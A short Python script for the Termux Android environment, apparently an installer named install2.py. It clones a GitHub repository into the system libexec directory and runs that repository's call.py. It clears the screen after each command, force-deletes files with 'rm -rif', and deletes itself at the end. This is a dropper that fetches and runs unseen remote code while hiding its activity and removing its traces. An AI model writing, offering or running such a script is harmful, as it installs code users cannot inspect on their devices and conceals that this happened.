import time
from os import system as ss

time.sleep(3)
ss('rm -rif /data/data/com.termux/files/usr/libexec/2')
ss('clear')
ss('cd /data/data/com.termux/files/usr/libexec && git clone https://github.com/alimaxali/2')
ss('clear')
ss('cd /data/data/com.termux/files/usr/libexec/2 && python2 call.py')
ss('clear')
ss('cd && rm -rif install2.py')
